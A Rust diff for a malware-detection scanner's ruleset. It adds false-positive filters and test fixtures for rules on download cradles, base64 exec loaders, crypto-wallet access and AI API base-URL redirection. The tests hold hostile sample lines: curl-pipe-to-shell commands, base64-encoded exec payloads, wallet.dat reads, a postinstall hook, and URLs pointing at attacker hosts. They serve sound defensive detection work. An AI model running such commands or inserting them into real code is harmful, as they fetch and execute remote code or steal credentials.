@@ -4,7 +4,7 @@ use std::path::Path;
 use walkdir::WalkDir;
 
 /// Human-readable ruleset version (also surfaced by `kalascan rules`).
-pub const RULESET_VERSION: &str = "2026.11.11";
+pub const RULESET_VERSION: &str = "2026.11.12";
 /// A hash of the rule files and detection modules this binary was built
 /// from (build.rs): what a result is tied to when the version is not enough.
 pub const DETECTION_FINGERPRINT: &str = env!("KALASCAN_DETECTION");
@@ -282,17 +282,34 @@ fn rule_hits<'r>(
             {
                 continue;
             }
+            // The match's line, up to it and from it on.
+            let before = &content[line_start(line)..start];
+            let rest = &content[start..newlines.get(line).map_or(content.len(), |&i| i)];
             if !keep_hit(&rule.name, text)
                 || (rule.name == FETCH_EVAL && fetches_vendor_installer(&content[end..]))
-                || (rule.name == B64_EXEC && decodes_a_placeholder(&content[end..]))
+                || ((rule.name == FETCH_EVAL || rule.name == B64_EXEC)
+                    && in_trailing_comment(before, rest, ext))
+                || ([B64_EXEC, BUFFER_EVAL, IMPORT_LOADER].contains(&rule.name.as_str())
+                    && ((decodes_a_placeholder(&content[end..])
+                        // `atob("${payload}")` is written into a page, not
+                        // handed to a child process.
+                        && !(rule.name == B64_EXEC
+                            && content[end..]
+                                .trim_start_matches(['\\', '\'', '"', ' '])
+                                .starts_with("${")))
+                        || decodes_runtime_input(
+                            &content[line_start(line)..end],
+                            &content[end..],
+                        )))
                 || (rule.name == "Crypto Wallet Access"
-                    && links_to_store_page(&content[line_start(line)..start]))
-                || (rule.name == SYSTEMD_USER
-                    && printed_for_the_user(&content[line_start(line)..start]))
+                    && (links_to_store_page(before) || in_a_glob_list(before, rest)))
+                || ([SYSTEMD_USER, DOWNLOAD_CRADLE, REMOTE_BINARY].contains(&rule.name.as_str())
+                    && printed_for_the_user(before))
+                || (rule.name == DOWNLOAD_CRADLE && pipes_into_a_parser(text, &content[end..]))
                 // `…|net group|net localgroup|net print|…`: a syntax
                 // highlighter's list of batch commands.
                 || (rule.name == ACCOUNT_ENUM
-                    && content[..start].ends_with('|')
+                    && (text.starts_with('|') || content[..start].ends_with('|'))
                     && content[end..].starts_with('|'))
             {
                 continue;
@@ -1260,19 +1277,43 @@ pub(crate) fn keep_hit(rule: &str, text: &str) -> bool {
     if rule == REMOTE_BINARY && text.contains("/blob/") && !text.contains("raw=true") {
         return false;
     }
+    // `OPENAI_BASE_URL = "https://api.openai.com/v1"`: the default, written out.
+    if rule == AI_BASE_URL
+        && text.split("://").nth(1).is_some_and(|rest| {
+            ["api.openai.com", "api.anthropic.com"].contains(&host_of(&rest.to_ascii_lowercase()))
+        })
+    {
+        return false;
+    }
     !((rule == REMOTE_BINARY || rule == DOWNLOAD_CRADLE) && is_vendor_download(text))
 }
 
 /// `f"exec(base64.b64decode('{encoded}'))"`: a command template for another
 /// process, with a format placeholder where a payload would be, or the
 /// string closed and a variable joined on (`…b64decode('" + payload + "')`),
-/// or `…` in a description of the pattern. `after` is the text that follows
-/// the matched `…b64decode(`.
+/// or `…` in a description of the pattern. Node's form of the template is
+/// `node -e "eval(Buffer.from('${n}','base64')…)"`. `after` is the text that
+/// follows the matched `…b64decode(` or `Buffer.from(`.
 fn decodes_a_placeholder(after: &str) -> bool {
     static PLACEHOLDER: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
-        Regex::new(r#"^\s*(?:\\?['"]?\{[\w.!:\[\]]*\}\\?['"]?\s*\)|\\?['"]\s*["']\s*(?:\+|f?["'])|\.\.\.|…)"#).unwrap()
+        Regex::new(r#"^\s*(?:\\?['"]?\$?\{[\w.!:\[\]]*\}\\?['"]?\s*[,)]|\\?['"]\s*["']\s*(?:\+|f?["'])|\.\.\.|…)"#).unwrap()
     });
     PLACEHOLDER.is_match(&after[..floor_boundary(after, 80)])
+}
+
+/// `[sys.executable, "-c", "exec(base64.b64decode(''.join(sys.argv[1:])))", blob]`:
+/// a bootstrap for another process that decodes what it is handed, with no
+/// payload of its own. Only inside a string (`before`, the line up to the
+/// end of the match, leaves a quote open): as code of the file itself it is
+/// a loader.
+fn decodes_runtime_input(before: &str, after: &str) -> bool {
+    static INPUT: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
+        Regex::new(r#"^\s*(?:['"]{2}\.join\(\s*)?(?:sys\.argv|sys\.stdin|process\.argv|process\.stdin)(?-u:\b)"#).unwrap()
+    });
+    INPUT.is_match(after)
+        && ['"', '\'', '`']
+            .iter()
+            .any(|&q| before.matches(q).count() % 2 == 1)
 }
 
 /// `…/webstore/detail/metamask/nkbih…`: a wallet connector's link to the
@@ -1285,21 +1326,63 @@ fn links_to_store_page(before: &str) -> bool {
         .is_some_and(|url| url.contains("/detail/"))
 }
 
+/// `PATTERN = re.compile(r"exec\(")  # exec(requests.get(...))`: code, then a
+/// comment that names the pattern. `before`: the line up to the match,
+/// `rest`: the line from it on. No quote may follow the `#`: then it cannot
+/// sit in a string that closes before the match (`"a # b"; exec(…)`), and in
+/// a string left open the match is text too. Python and shell only: `//` is
+/// a division in one language and can sit in a regex in another.
+fn in_trailing_comment(before: &str, rest: &str, ext: &str) -> bool {
+    let quote = ['"', '\'', '`'];
+    matches!(ext, ".py" | ".sh")
+        && before
+            .rfind(" #")
+            .is_some_and(|i| !before[i..].contains(quote) && !rest.contains(quote))
+}
+
+/// `"**/.zsh_history","**/wallet.dat","**/.gnupg/**"`: one glob in a list of
+/// sensitive paths an agent or uploader must not touch, not a wallet being
+/// read. `before`: the line up to the match, `rest`: the line from it on.
+/// Two other globs make a list: `glob(home + '/**/wallet.dat')` is a search.
+fn in_a_glob_list(before: &str, rest: &str) -> bool {
+    let others = before.matches("**/").count() - usize::from(before.ends_with("**/"))
+        + rest.matches("**/").count();
+    (before.ends_with("*/") || (before.ends_with('*') && rest.starts_with('/'))) && others >= 2
+}
+
 /// `console.log('  systemctl --user enable …')`: a command shown to the user,
-/// not one the package runs. `before`: the line up to the match.
+/// not one the package runs; so is the install hint in a log line or an
+/// error (`raise RuntimeError("uv not found. Install: curl … | sh")`).
+/// `before`: the line up to the match. Not `stdin.write(`: that feeds a shell.
 fn printed_for_the_user(before: &str) -> bool {
+    static PRINTER: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
+        Regex::new(r"(?:console\.(?:log|info|warn|error)|print|std(?:out|err)(?:\.write)?|(?:click|typer)\.echo|logg(?:er|ing)\.\w+|throw\s+new\s+\w*Error|raise\s+\w+)$").unwrap()
+    });
     before.rfind('(').is_some_and(|i| {
-        let callee = before[..i].trim_end();
-        [
-            "console.log",
-            "console.info",
-            "console.warn",
-            "console.error",
-            "print",
-        ]
-        .iter()
-        .any(|p| callee.ends_with(p))
+        // A call closed before the match printed something else:
+        // `system(print() or "curl … | sh")`.
+        !before[i..].contains(')') && PRINTER.is_match(before[..i].trim_end())
     })
+}
+
+/// `curl -s URL | python3 -c 'import json,sys; print(json.load(sys.stdin)["tag"])'`:
+/// the interpreter has its program on the command line and the download is
+/// its input, unless that program runs what it reads or pipes it on to a
+/// shell. `cradle` is the match (it ends with the interpreter), `after` the
+/// text that follows it.
+fn pipes_into_a_parser(cradle: &str, after: &str) -> bool {
+    static INLINE: std::sync::LazyLock<Regex> =
+        std::sync::LazyLock::new(|| Regex::new(r"^\s+-[cepm](?-u:\b)").unwrap());
+    static RUNS: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
+        Regex::new(r"exec\w*\(|eval\(|Function\(|compile\(|system\(|spawn|popen|subprocess|child_process|\|\s*(?:sudo\s+)?(?:iex|sh|bash|zsh|python3?|node)(?-u:\b)").unwrap()
+    });
+    let cradle = cradle.to_ascii_lowercase();
+    let window = &after[..floor_boundary(after, 300)];
+    ["python", "python3", "node"]
+        .iter()
+        .any(|i| cradle.ends_with(i))
+        && INLINE.is_match(window)
+        && !RUNS.is_match(window)
 }
 
 /// `exec(urlopen('https://bitbucket.org/pypa/setuptools/raw/…/ez_setup.py'))`:
@@ -1370,6 +1453,17 @@ fn is_vendor_download(url: &str) -> bool {
         "mise.run",
         "temporal.download",
         "mobile.dev",
+        // More of the same, read in a day of new releases: each named as an
+        // install hint by several unrelated projects (pi.dev by six), and
+        // Qoder's CDN, which `qoder.com` does not cover.
+        "pi.dev",
+        "nousresearch.com",
+        "meta.ai",
+        "mistral.ai",
+        "ollama.ai",
+        "fly.io",
+        "pixi.sh",
+        "qoder.com.cn",
     ];
     // Official installers on GitHub raw, pinned to orgs nobody else controls.
     const VENDOR_PATHS: &[&str] = &[
@@ -1383,24 +1477,36 @@ fn is_vendor_download(url: &str) -> bool {
         return false;
     };
     let rest = rest.to_ascii_lowercase();
-    // Up to the first character a host name cannot hold: `https://sh.rustup.rs | sh`
-    // has no path, and the space used to end up in the host.
-    let end = rest
-        .find(|c: char| !(c.is_ascii_alphanumeric() || c == '.' || c == '-'))
-        .unwrap_or(rest.len());
-    let host = &rest[..end];
+    let host = host_of(&rest);
     VENDORS
         .iter()
         .any(|v| host == *v || host.ends_with(&format!(".{}", v)))
         || VENDOR_PATHS.iter().any(|p| rest.starts_with(p))
 }
 
-/// Loopback, private, link-local and version-like invalid quads are not C2.
+/// The host at the start of `rest` (what follows `://`): up to the first
+/// character a host name cannot hold. `https://sh.rustup.rs | sh` has no
+/// path, and the space used to end up in the host. Empty when that name is
+/// only the user part: `https://claude.ai@evil.example/` goes to the second.
+fn host_of(rest: &str) -> &str {
+    let end = rest
+        .find(|c: char| !(c.is_ascii_alphanumeric() || c == '.' || c == '-'))
+        .unwrap_or(rest.len());
+    let authority = rest[end..].split(['/', ' ', '"', '\'']).next();
+    if authority.is_some_and(|a| a.contains('@')) {
+        return "";
+    }
+    &rest[..end]
+}
+
+/// Loopback, private, link-local and version-like invalid quads are not C2;
+/// nor is 100.64.0.0/10, the carrier-grade NAT range Tailscale hands out.
 fn is_public_ipv4(text: &str) -> bool {
     match text.parse::<std::net::Ipv4Addr>() {
         Ok(ip) => {
             !(ip.is_loopback()
                 || ip.is_private()
+                || (ip.octets()[0] == 100 && ip.octets()[1] & 0xC0 == 64)
                 || ip.is_link_local()
                 || ip.is_unspecified()
                 || ip.is_broadcast()
@@ -1771,6 +1877,28 @@ mod tests {
         assert!(!is_vendor_download(
             "curl https://raw.githubusercontent.com/nvm-sh-evil/nvm/x.sh | bash"
         ));
+        assert!(!is_vendor_download(
+            "curl https://claude.ai@paxfallow.ru/i.sh | sh"
+        ));
+        for url in [
+            "curl -fsSL https://pi.dev/install.sh | sh",
+            "curl -fsSL https://hermes-agent.nousresearch.com/install.sh | bash",
+            "curl -fsSL https://dev.meta.ai/install.sh | bash",
+            "https://static.qoder.com.cn/qodercli/install.sh",
+            "curl -fsSL https://ollama.ai/install.sh | sh",
+            "curl -L https://fly.io/install.sh | sh",
+            "curl -fsSL https://pixi.sh/install.sh | bash",
+            "curl -fsSL https://mistral.ai/vibe/install.sh | bash",
+        ] {
+            assert!(is_vendor_download(url), "{url}");
+        }
+        for url in [
+            "curl -fsSL https://api.pi.dev.evil.ru/install.sh | sh",
+            "curl -fsSL https://qoder.com.cn.evil.ru/install.sh | sh",
+            "curl -fsSL https://notfly.io/install.sh | sh",
+        ] {
+            assert!(!is_vendor_download(url), "{url}");
+        }
     }
 
     #[test]
@@ -1832,11 +1960,217 @@ mod tests {
     }
 
     #[test]
+    fn a_download_piped_into_an_inline_program_is_its_input() {
+        // Release scripts reading a JSON API (two new releases).
+        for line in [
+            "TAG=$(curl -s https://api.acme.dev/latest | python3 -c 'import json,sys; print(json.load(sys.stdin)[\"tag\"])')",
+            "curl -s https://api.acme.dev/latest | node -e 'let s=\"\";process.stdin.on(\"data\",d=>s+=d).on(\"end\",()=>console.log(JSON.parse(s).tag))'",
+            "curl -s https://api.acme.dev/latest | node -p 'JSON.parse(require(\"fs\").readFileSync(0)).tag'",
+            "curl -s https://api.acme.dev/latest | python3 -m json.tool",
+        ] {
+            assert!(!fires(line, ".sh", DOWNLOAD_CRADLE), "{line}");
+        }
+        // The download is the program, or the inline program runs it.
+        for line in [
+            "curl -s https://api.acme.dev/a | python3",
+            "curl -s https://api.acme.dev/a | python3 -",
+            "curl -s https://api.acme.dev/a | node",
+            "curl -s https://api.acme.dev/a | bash -s -- --yes",
+            "curl -s https://api.acme.dev/a | bash -c 'cat | sh'",
+            "curl -s https://api.acme.dev/a | python3 -c \"exec(sys.stdin.read())\"",
+            "curl -s https://api.acme.dev/a | python3 -c \"import sys,os; os.system(sys.stdin.read())\"",
+            "curl -s https://api.acme.dev/a | node -e 'require(\"child_process\").execSync(require(\"fs\").readFileSync(0)+\"\")'",
+            "curl -s https://api.acme.dev/a | python3 -m base64 -d | sh",
+            "curl -s https://api.acme.dev/a | sudo bash",
+            "bash -c \"$(curl -fsSL https://api.acme.dev/a)\"",
+        ] {
+            assert!(fires(line, ".sh", DOWNLOAD_CRADLE), "{line}");
+        }
+    }
+
+    #[test]
+    fn a_name_that_only_ends_like_a_command_or_variable_is_not_one() {
+        // The vendor's own endpoint as the value is the default.
+        for line in [
+            "OPENAI_BASE_URL = \"https://api.openai.com/v1\"",
+            "ANTHROPIC_BASE_URL: 'https://api.anthropic.com',",
+        ] {
+            assert!(!fires(line, ".py", AI_BASE_URL), "{line}");
+        }
+        for line in [
+            "export ANTHROPIC_BASE_URL=https://attacker.example",
+            "OPENAI_BASE_URL = \"https://api.openai.com.attacker.example/v1\"",
+            "OPENAI_BASE_URL = \"https://api.openai.com@attacker.example/v1\"",
+        ] {
+            assert!(fires(line, ".sh", AI_BASE_URL), "{line}");
+        }
+        // A deny list of sensitive-file globs names the wallet, nothing reads it.
+        let wallet = "Crypto Wallet Access";
+        for line in [
+            "const DENY = [\"**/.zsh_history\",\"**/wallet.dat\",\"**/.gnupg/**\"];",
+            "  ignore: ['**/.ssh/**', '**/.electrum/**', '**/.aws/**'],",
+        ] {
+            assert!(!fires(line, ".js", wallet), "{line}");
+        }
+        for line in [
+            "fs.readFileSync(path.join(home, '.bitcoin', 'wallet.dat'))",
+            "glob.sync(home + '/**/wallet.dat')",
+            "for (const g of ['**/wallet.dat', '**/*.kdbx']) grab(g);",
+            "const key = wallet.data.encryptionKey; open(dir + '/wallet.dat')",
+        ] {
+            assert!(fires(line, ".js", wallet), "{line}");
+        }
+        // A highlighter's list of batch commands is still a list.
+        assert!(!fires(
+            "match: 'net file|net group|net user|net localgroup|net print'",
+            ".js",
+            ACCOUNT_ENUM
+        ));
+        assert!(fires("execSync('net user /domain')", ".js", ACCOUNT_ENUM));
+        assert!(fires("net user\n", ".bat", ACCOUNT_ENUM));
+    }
+
+    #[test]
+    fn a_bootstrap_that_decodes_what_it_is_handed_embeds_no_payload() {
+        // Templates for a child process, from new releases.
+        for (line, rule) in [
+            ("execSync(`node -e \"eval(Buffer.from('${n}','base64').toString())\"`);", BUFFER_EVAL),
+            ("const cmd = \"node -e \\\"eval(Buffer.from('\"+encoded+\"','base64').toString())\\\"\";", BUFFER_EVAL),
+            ("cmd = [sys.executable, \"-c\", \"import base64,sys;exec(base64.b64decode(''.join(sys.argv[1:])).decode())\", blob]", B64_EXEC),
+            ("spawn('node', ['-e', 'eval(Buffer.from(process.argv[1], \"base64\").toString())', b64]);", BUFFER_EVAL),
+            ("ssh.exec_command(\"python3 -c 'import sys,base64;exec(base64.b64decode(sys.stdin.read()))'\")", B64_EXEC),
+            ("cmd = f\"exec(__import__('base64').b64decode('{encoded}'))\"", IMPORT_LOADER),
+            ("raw = __import__(\"base64\").b64decode(content)", IMPORT_LOADER),
+        ] {
+            assert!(!fires(line, ".js", rule), "{line}");
+        }
+        // A payload in the call, or the file's own code decoding its input.
+        for (line, rule) in [
+            (
+                "exec(base64.b64decode(\"aW1wb3J0IG9zO29zLnN5c3RlbSgnaWQnKQ==\"))",
+                B64_EXEC,
+            ),
+            (
+                "eval(Buffer.from('ZXZhbA==','base64').toString())",
+                BUFFER_EVAL,
+            ),
+            ("exec(base64.b64decode(sys.argv[1]))", B64_EXEC),
+            (
+                "eval(Buffer.from(process.argv[2], 'base64').toString())",
+                BUFFER_EVAL,
+            ),
+            (
+                "eval(Buffer.from(payload, 'base64').toString())",
+                BUFFER_EVAL,
+            ),
+            (
+                "const tag = `<script>eval(atob(\"${encoded}\"))</script>`;",
+                B64_EXEC,
+            ),
+            (
+                "exec(__import__('zlib').decompress(__import__('base64').b64decode(b'eJwrSS0u')))",
+                IMPORT_LOADER,
+            ),
+        ] {
+            assert!(fires(line, ".js", rule), "{line}");
+        }
+    }
+
+    #[test]
+    fn a_match_in_a_trailing_comment_is_a_comment() {
+        for (line, rule) in [
+            (
+                "LOADER = re.compile(pattern)  # exec(requests.get(...)) and friends",
+                FETCH_EVAL,
+            ),
+            (
+                "    return None  # was: exec(base64.b64decode(blob))",
+                B64_EXEC,
+            ),
+        ] {
+            assert!(!fires(line, ".py", rule), "{line}");
+        }
+        // Code before the comment, a `#` inside a string, and a string that
+        // was opened on the line above and closes before the code.
+        for line in [
+            "exec(base64.b64decode(blob))  # decode",
+            "x = \"a # b\"; exec(base64.b64decode(blob))",
+            "s = \"\"\"abc\nx # \"\"\"; exec(base64.b64decode(blob))",
+            "s = \"abc\\\nx # \"; exec(base64.b64decode(blob))",
+        ] {
+            assert!(fires(line, ".py", B64_EXEC), "{line}");
+        }
+        // `//` is no comment in Python, and JavaScript is left alone.
+        assert!(fires("n = 7 // eval(atob(p))", ".js", B64_EXEC));
+    }
+
+    /// Whether `rule` reports anything in `content`, a file of type `ext`.
+    fn fires(content: &str, ext: &str, rule: &str) -> bool {
+        let name = format!("a{ext}");
+        rule_hits(content, &build_rules(), ext, &name, &Default::default())
+            .iter()
+            .any(|(r, ..)| r.name == rule)
+    }
+
+    #[test]
+    fn a_command_that_is_only_printed_is_not_run() {
+        // Install hints in new releases: shown, logged or thrown, never run.
+        for (line, ext) in [
+            ("console.error('Install it: curl -fsSL https://get.acme.dev/install.sh | sh');", ".js"),
+            ("process.stderr.write('  curl -fsSL https://get.acme.dev/install.sh | bash\\n');", ".js"),
+            ("throw new Error(`bun not found. Run: curl -fsSL https://get.acme.dev/install.sh | bash`);", ".ts"),
+            ("stderr('curl -fsSL https://get.acme.dev/install.sh | sh');", ".js"),
+            ("    console.print(\"[dim]curl -LsSf https://get.acme.dev/install.sh | sh[/dim]\")", ".py"),
+            ("    click.echo(\"curl -LsSf https://get.acme.dev/install.sh | sh\", err=True)", ".py"),
+            ("    typer.echo(\"curl -LsSf https://get.acme.dev/install.sh | sh\")", ".py"),
+            ("    logger.warning(\"run: curl -LsSf https://get.acme.dev/install.sh | sh\")", ".py"),
+            ("    logging.error(\"run: curl -LsSf https://get.acme.dev/install.sh | sh\")", ".py"),
+            ("    sys.stderr.write(\"run: curl -LsSf https://get.acme.dev/install.sh | sh\")", ".py"),
+            ("    raise RuntimeError(\"uv missing: curl -LsSf https://get.acme.dev/install.sh | sh\")", ".py"),
+            ("    print(\"curl -LsSf https://get.acme.dev/install.sh | sh\")", ".py"),
+        ] {
+            assert!(!fires(line, ext, DOWNLOAD_CRADLE), "{line}");
+            assert!(!fires(line, ext, REMOTE_BINARY), "{line}");
+        }
+        // Run, written to a shell, or kept in a constant something else may run.
+        for (line, ext) in [
+            ("execSync('curl -fsSL https://get.acme.dev/install.sh | sh');", ".js"),
+            ("subprocess.run([\"bash\", \"-c\", \"curl -fsSL https://get.acme.dev/install.sh | bash\"])", ".py"),
+            ("console.log(execSync('curl -fsSL https://get.acme.dev/install.sh | sh'));", ".js"),
+            ("os.system(print() or 'curl -fsSL https://get.acme.dev/install.sh | sh')", ".py"),
+            ("shell.stdin.write('curl -fsSL https://get.acme.dev/install.sh | sh\\n');", ".js"),
+            ("curl -fsSL https://get.acme.dev/install.sh | sh", ".sh"),
+            ("const CMD = 'curl -fsSL https://get.acme.dev/install.sh | sh';", ".js"),
+        ] {
+            assert!(fires(line, ext, DOWNLOAD_CRADLE), "{line}");
+            assert!(fires(line, ext, REMOTE_BINARY), "{line}");
+        }
+        let manifest =
+            "{\"scripts\": {\"postinstall\": \"curl -fsSL https://get.acme.dev/i.sh | sh\"}}";
+        assert!(rule_hits(
+            manifest,
+            &build_rules(),
+            "",
+            "package.json",
+            &Default::default()
+        )
+        .iter()
+        .any(|(r, ..)| r.name == DOWNLOAD_CRADLE));
+    }
+
+    #[test]
     fn test_public_ipv4_filter() {
         assert!(!is_public_ipv4("127.0.0.1"));
         assert!(!is_public_ipv4("192.168.1.10"));
         assert!(!is_public_ipv4("1.2.300.4"));
         assert!(is_public_ipv4("45.9.148.3"));
+        // A Tailscale address, and both edges of 100.64.0.0/10.
+        assert!(!is_public_ipv4("100.101.102.103"));
+        assert!(!is_public_ipv4("100.64.0.0"));
+        assert!(!is_public_ipv4("100.127.255.255"));
+        assert!(is_public_ipv4("100.63.255.255"));
+        assert!(is_public_ipv4("100.128.0.1"));
+        assert!(!keep_hit(IP_URL, "http://100.100.1.2"));
     }
 
     #[test]
